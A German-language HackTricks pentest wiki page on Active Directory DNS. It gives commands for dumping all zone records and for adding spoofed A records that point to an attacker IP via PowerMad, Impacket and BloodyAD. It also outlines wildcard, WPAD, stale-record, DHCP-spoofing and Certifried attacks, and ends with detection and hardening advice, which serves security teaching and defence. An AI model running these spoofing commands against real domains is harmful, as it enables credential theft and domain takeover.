# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Standardmäßig kann **jeder Benutzer** in Active Directory **alle DNS-Einträge** in den DNS-Zonen der Domäne oder des Forests auflisten, ähnlich wie bei einem Zonentransfer (Benutzer können die untergeordneten Objekte einer DNS-Zone in einer AD-Umgebung auflisten).

Das Tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) ermöglicht die **Auflistung** und **Exportierung** von **allen DNS-Einträgen** in der Zone zu Recon-Zwecken interner Netzwerke.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (April 2025) fügt JSON/Greppable (`--json`) Ausgabe, mehrfädige DNS-Auflösung und Unterstützung für TLS 1.2/1.3 beim Binden an LDAPS hinzu.

Für weitere Informationen lesen Sie [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Erstellen / Ändern von Einträgen (ADIDNS Spoofing)

Da die Gruppe **Authenticated Users** standardmäßig **Create Child** auf der Zonen-DACL hat, kann jedes Domänenkonto (oder Computer-Konto) zusätzliche Einträge registrieren. Dies kann für Traffic-Hijacking, NTLM-Relay-Zwang oder sogar vollständige Domänenkompromittierung verwendet werden.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py wird mit Impacket ≥0.12.0 ausgeliefert)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Häufige Angriffsprimitive

1. **Wildcard-Eintrag** – `*.<zone>` verwandelt den AD DNS-Server in einen unternehmensweiten Responder, ähnlich wie LLMNR/NBNS-Spoofing. Es kann missbraucht werden, um NTLM-Hashes zu erfassen oder sie an LDAP/SMB weiterzuleiten.  (Erfordert, dass WINS-Abfragen deaktiviert sind.)
2. **WPAD-Hijack** – füge `wpad` (oder einen **NS**-Eintrag, der auf einen Angreifer-Host zeigt, um die Global-Query-Block-List zu umgehen) hinzu und proxy transparent ausgehende HTTP-Anfragen, um Anmeldeinformationen zu sammeln.  Microsoft hat die Wildcard/DNAME-Umgehungen (CVE-2018-8320) gepatcht, aber **NS-Einträge funktionieren weiterhin**.
3. **Übernahme veralteter Einträge** – beanspruche die IP-Adresse, die zuvor zu einem Arbeitsplatz gehörte, und der zugehörige DNS-Eintrag wird weiterhin aufgelöst, was ressourcenbasierte eingeschränkte Delegation oder Shadow-Credentials-Angriffe ermöglicht, ohne DNS überhaupt zu berühren.
4. **DHCP → DNS-Spoofing** – bei einer Standard-Windows-DHCP+DNS-Bereitstellung kann ein nicht authentifizierter Angreifer im selben Subnetz jeden vorhandenen A-Eintrag (einschließlich Domänencontroller) überschreiben, indem er gefälschte DHCP-Anfragen sendet, die dynamische DNS-Updates auslösen (Akamai “DDSpoof”, 2023).  Dies gibt Maschinen-in-der-Mitte über Kerberos/LDAP und kann zu einer vollständigen Übernahme der Domäne führen.
5. **Certifried (CVE-2022-26923)** – ändere den `dNSHostName` eines Maschinenkontos, das du kontrollierst, registriere einen passenden A-Eintrag und fordere dann ein Zertifikat für diesen Namen an, um den DC zu impersonieren. Tools wie **Certipy** oder **BloodyAD** automatisieren den Ablauf vollständig.

---

## Erkennung & Härtung

* Verweigere **authentifizierten Benutzern** das Recht *Alle untergeordneten Objekte erstellen* in sensiblen Zonen und delegiere dynamische Updates an ein dediziertes Konto, das von DHCP verwendet wird.
* Wenn dynamische Updates erforderlich sind, setze die Zone auf **Nur-sicher** und aktiviere **Namensschutz** in DHCP, sodass nur das Eigentümer-Computerobjekt seinen eigenen Eintrag überschreiben kann.
* Überwache die DNS-Server-Ereignis-IDs 257/252 (dynamisches Update), 770 (Zonenübertragung) und LDAP-Schreibvorgänge zu `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blockiere gefährliche Namen (`wpad`, `isatap`, `*`) mit einem absichtlich harmlosen Eintrag oder über die Global Query Block List.
* Halte DNS-Server gepatcht – z.B. RCE-Fehler CVE-2024-26224 und CVE-2024-26231 erreichten **CVSS 9.8** und sind aus der Ferne gegen Domänencontroller ausnutzbar.

## Referenzen

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL und mehr”  (2018, immer noch das de-facto Referenzwerk für Wildcard/WPAD-Angriffe)
* Akamai – “Spoofing von DNS-Einträgen durch Missbrauch dynamischer DHCP-DNS-Updates” (Dez 2023)
{{#include ../../banners/hacktricks-training.md}}
